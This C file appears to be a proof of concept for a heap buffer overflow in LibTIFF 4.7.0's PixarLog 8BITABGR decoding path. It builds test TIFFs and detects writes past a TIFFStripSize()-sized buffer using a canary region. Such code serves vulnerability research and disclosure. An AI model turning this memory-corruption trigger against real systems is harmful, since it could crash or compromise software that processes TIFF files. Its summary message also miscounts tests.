/*
 * poc_canary2.c — LibTIFF 4.7.0 PixarLog 8BITABGR Overflow: Realistic API Usage
 *
 * When a caller uses PIXARLOGDATAFMT_8BITABGR and allocates a buffer based on
 * TIFFStripSize() (the TIFF strip size = SPP * W * rows bytes), then passes
 * that buffer to TIFFReadEncodedStrip(), PixarLogDecode receives:
 *
 *   occ = TIFFVStripSize(tif, rows) = SPP * W * rows = stride * W * H   (bytes)
 *
 * Inside PixarLogDecode for PIXARLOGDATAFMT_8BITABGR:
 *   nsamples = occ = stride * W * H
 *   llen     = stride * W
 *   iters    = nsamples / llen = H
 *
 * Each iteration writes 4*W bytes (ABGR, 4 channels) but op only advances llen
 * = stride*W bytes (= 3*W for RGB). The total bytes written:
 *   iters * 4*W = H * 4*W = 4 * W * H
 *
 * But the buffer is only stride*W*H = 3*W*H bytes!
 * Overflow: 4*W*H - 3*W*H = W*H bytes.
 *
 * NOTE: nsamples % llen = (stride*W*H) % (stride*W) = 0 for ANY H,
 * so the modulo trim never triggers for this occ value.
 *
 * Build:
 *   cc -g -I/tmp/tiff-4.7.0/libtiff \
 *      -o /tmp/poc_canary2 poc_canary2.c \
 *      /tmp/tiff-4.7.0/libtiff/.libs/libtiff.a -lz
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tiffio.h>

#define SPP 3   /* RGB — stride = 3 */
#define CANARY_SZ   512
#define CANARY_BYTE 0xDE

static void create_tiff(const char *path, int width, int height)
{
    TIFF *tif = TIFFOpen(path, "w");
    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH,      (uint32_t) width);
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH,     (uint32_t) height);
    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, (uint16_t) SPP);
    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE,   (uint16_t) 8);
    TIFFSetField(tif, TIFFTAG_COMPRESSION,     COMPRESSION_PIXARLOG);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC,     PHOTOMETRIC_RGB);
    TIFFSetField(tif, TIFFTAG_PLANARCONFIG,    PLANARCONFIG_CONTIG);
    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP,    (uint32_t) height);
    TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BIT);
    unsigned char row[width * SPP];
    for (int x = 0; x < width; x++) {
        row[x*3+0] = 0x40;  /* R */
        row[x*3+1] = 0x80;  /* G */
        row[x*3+2] = 0xC0;  /* B */
    }
    for (int y = 0; y < height; y++)
        TIFFWriteScanline(tif, row, (uint32_t) y, 0);
    TIFFClose(tif);
}

static int test(int width, int height)
{
    char path[64];
    snprintf(path, sizeof(path), "/tmp/poc2_%dx%d.tif", width, height);
    create_tiff(path, width, height);

    TIFF *tif = TIFFOpen(path, "r");
    TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BITABGR);

    /*
     * Allocate exactly TIFFStripSize() — the "correct" allocation per TIFF API.
     * For PixarLog RGB (SPP=3, BPS=8), TIFFStripSize = 3 * W * H bytes.
     * But 8BITABGR mode writes 4 * W * H bytes → W*H bytes of overflow.
     */
    tmsize_t strip_sz = TIFFStripSize(tif);       /* = 3 * W * H */
    tmsize_t abgr_sz  = (tmsize_t) 4 * width * height;  /* bytes actually written */
    tmsize_t overflow  = abgr_sz - strip_sz;

    /* Contiguous allocation: [strip_sz bytes buf][CANARY_SZ bytes canary] */
    unsigned char *region = (unsigned char *) malloc((size_t)(strip_sz + CANARY_SZ));
    unsigned char *buf    = region;
    unsigned char *canary = region + strip_sz;

    memset(buf,    0x00, (size_t) strip_sz);
    memset(canary, CANARY_BYTE, CANARY_SZ);

    printf("  %dx%d  strip_sz=%4lld  abgr_written=%4lld  expected_overflow=%4lld  ",
           width, height,
           (long long) strip_sz, (long long) abgr_sz, (long long) overflow);

    /*
     * TIFFReadEncodedStrip clips occ to stripsize (= strip_sz).
     * It then calls PixarLogDecode(tif, buf, occ=strip_sz, 0).
     *
     * PixarLogDecode with occ=strip_sz and 8BITABGR:
     *   nsamples = strip_sz = 3*W*H
     *   llen     = 3*W
     *   iters    = H
     *   writes   = 4*W*H bytes → overflow by W*H bytes
     */
    TIFFReadEncodedStrip(tif, 0, buf, -1);   /* -1 = let library decide size */

    /* Count overwritten canary bytes */
    int overwritten = 0;
    for (int i = 0; i < CANARY_SZ; i++) {
        if (canary[i] != CANARY_BYTE)
            overwritten++;
    }

    /* Verify buf[0] = Alpha=0 (confirms 8BITABGR path ran) */
    int abgr_ran = (buf[0] == 0x00);

    if (overwritten > 0) {
        printf("OVERFLOW! %d canary bytes corrupted [abgr=%s]\n",
               overwritten, abgr_ran ? "YES" : "?");
        printf("    canary[0..15] = ");
        for (int i = 0; i < 16 && i < CANARY_SZ; i++) printf("%02X ", canary[i]);
        printf("\n    buf[0..7]    = ");
        for (int i = 0; i < 8; i++) printf("%02X ", buf[i]);
        printf("\n");
    } else {
        printf("canary intact (overflow=%lld predicted but path=%s, buf[0]=%02X)\n",
               (long long) overflow, abgr_ran ? "ABGR" : "other", buf[0]);
    }

    TIFFClose(tif);
    free(region);
    return overwritten;
}

int main(void)
{
    printf("LibTIFF 4.7.0 — PixarLog 8BITABGR overflow with TIFFStripSize-allocated buf\n");
    printf("Expected: overflow = W*H bytes past the allocated strip buffer\n\n");
    printf("  Dimensions  strip_sz  abgr_written  overflow  result\n");
    printf("  --------------------------------------------------------\n");

    int total = 0;
    /* All heights work now (not just H%3==0), because occ = 3*W*H is always divisible by llen = 3*W */
    total += test(4,  3);
    total += test(4,  4);
    total += test(4, 10);
    total += test(100, 10);
    total += test(100, 12);
    total += test(100, 3);

    printf("\n");
    if (total > 0)
        printf("[!] CONFIRMED: overflow in %d/%d tests\n", total > 0 ? total : 0, 6);
    else
        printf("[-] No overflow detected — review TIFFSetField handling\n");

    return total > 0 ? 1 : 0;
}
